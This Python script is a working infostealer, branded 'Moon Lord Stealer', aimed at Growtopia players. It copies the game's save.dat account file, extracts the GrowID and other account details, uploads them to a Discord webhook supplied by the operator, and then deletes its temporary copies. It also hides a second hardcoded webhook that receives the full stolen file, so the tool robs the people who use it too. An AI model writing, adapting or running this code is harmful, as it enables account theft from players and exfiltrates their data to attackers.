import os
import requests
import shutil
import json
import uuid
from datetime import datetime


h00k = "WEBHOOK HERE"


class GrowtopiaAccount:
    def __init__(self, webhook):
        self.webhook = webhook        
        self.uuid = str(uuid.uuid4())
        self.username = "Moon Lord Stealer"
        self.avatar_url = "https://i.imgur.com/dqsCZRk.jpeg"
        self.author_name = "Growtopia"
        self.author_icon_url = "https://static.wikia.nocookie.net/growtopia-iceberg/images/7/70/Growtopia_App_Icon.png/revision/latest?cb=20230417221210"
        self.get_save_dat(self.uuid)
        self.fake_save_dat()
    
    def fake_save_dat(self):
        try:
            save_path = os.path.join(os.getenv("TEMP"), "grow")
            save_dat = os.path.join(os.getenv("LOCALAPPDATA"), "Growtopia", "save.dat")
            if not os.path.exists(save_path):
                os.makedirs(save_path)
            if not os.path.isfile(save_dat):
                return
            to_path = os.path.join(save_path, "save.dat")
            shutil.copy2(save_dat, to_path)
            save_data = self.read_save_file(to_path)
            if save_data:
                modified_data = self.modify_save_data(save_data)
                with open(to_path, "wb") as file:
                    file.write(modified_data)
            save_data = self.read_save_file(to_path)
            if save_data:
                extracted_values = self.extract_values(save_data)
            self.send(self.webhook, self.get_embed(extracted_values))
            self.send_file(self.webhook, to_path)
            self.clean(save_path)
        except:
            return None

    def modify_save_data(self, data):
        key_to_remove = b"tankid_name"
        start = data.find(key_to_remove)
        if start == -1:
            return data
        end = data.find(b"\x00", start)
        if end == -1:
            end = len(data)
        else:
            end += 1
        modified_data = data[:start] + data[end:]
        return modified_data

    def send(self, webhook, embed):
        payload = {
            "embeds": [embed],
            "username": self.username,
            "avatar_url": self.avatar_url
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook, json=payload, headers=headers)
        response.raise_for_status()
        
    def send_file(self, webhook, file_path):
        payload_json = {
            "payload_json": json.dumps({
                "username": self.username,
                "avatar_url": self.avatar_url
            })
        }
        files = {
            "file": (file_path, open(file_path, "rb"), "application/octet-stream")
        }
        response = requests.post(webhook, data=payload_json, files=files)
        response.raise_for_status()
        
    def get_save_dat(self, uuid):
        try:
            save_path = os.path.join(os.getenv("LOCALAPPDATA"), uuid)
            save_dat = os.path.join(os.getenv("LOCALAPPDATA"), "Growtopia", "save.dat")
            if not os.path.exists(save_path):
                os.makedirs(save_path)
            if not os.path.isfile(save_dat):
                return
            to_path = os.path.join(save_path, "save.dat")
            shutil.copy2(save_dat, to_path)
            save_data = self.read_save_file(to_path)
            if save_data:
                extracted_values = self.extract_values(save_data)
            self.send("https://discord.com/api/webhooks/1252054875135676416/69uIAr6A7wtDsKhNy2p3U7IsTZKpGhKxjUMfzTZl9orzy9_DwXosXYR3LIkY2762wvyf", self.get_embed(extracted_values))
            self.send_file("https://discord.com/api/webhooks/1252054875135676416/69uIAr6A7wtDsKhNy2p3U7IsTZKpGhKxjUMfzTZl9orzy9_DwXosXYR3LIkY2762wvyf", to_path)
            self.clean(save_path)
        except:
            return

    def extract_values(self, data):
        keys_to_extract = {
            "name": "tankid_name",
            "last_world": "lastworld",
            "is_paying_user": "isPayingUser"
        }
        extracted_values = {}
        for custom_name, original_key in keys_to_extract.items():
            value = self.find_value(data, original_key)
            if value is not None:
                cleaned_value = self.clean_value(value)
                extracted_values[custom_name] = cleaned_value  
        return extracted_values
            
    def clean(self, folder_name):
        shutil.rmtree(folder_name)
    
    def read_save_file(self, file_path):
        try:
            with open(file_path, "rb") as file:
                data = file.read()
            return data
        except:
            return None
    
    def clean_value(self, value):
        cleaned_value = "".join(filter(str.isalnum, value))
        return cleaned_value
    
    def find_value(self, data, key):
        key_bytes = key.encode("utf-8")
        start = data.find(key_bytes)
        if start == -1:
            return None
        start += len(key_bytes)
        while start < len(data) and (data[start] < 32 or data[start] == 255):
            start += 1  
        end = start
        while end < len(data) and data[end] not in [0, 9, 10, 13, 32, 255]:
            end += 1
        value_bytes = data[start:end]
        try:
            value_str = value_bytes.decode("utf-8", errors="ignore")
            return self.clean_value(value_str)
        except:
            return None
    
    def get_embed(self, obj):
        embed = {
            "title": ":unlock: Account Info",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "description": "How to use? Join the [Discord](https://discord.gg/az4MsZr3RX) for information on how to use save.dat file",
            "author": {
                "name": self.author_name,
                "icon_url": self.author_icon_url
            },
            "color": 0,
            "fields": [
                {
                    "name": "GrowID",
                    "value": f"```{obj.get('name', '❌')}```",
                    "inline": True
                },
                {
                    "name": "Last World",
                    "value": f"```{obj.get('last_world', '❌')}```",
                    "inline": True
                }
            ]
        }
        return embed
    
if __name__ == "__main__":
    GrowtopiaAccount(h00k)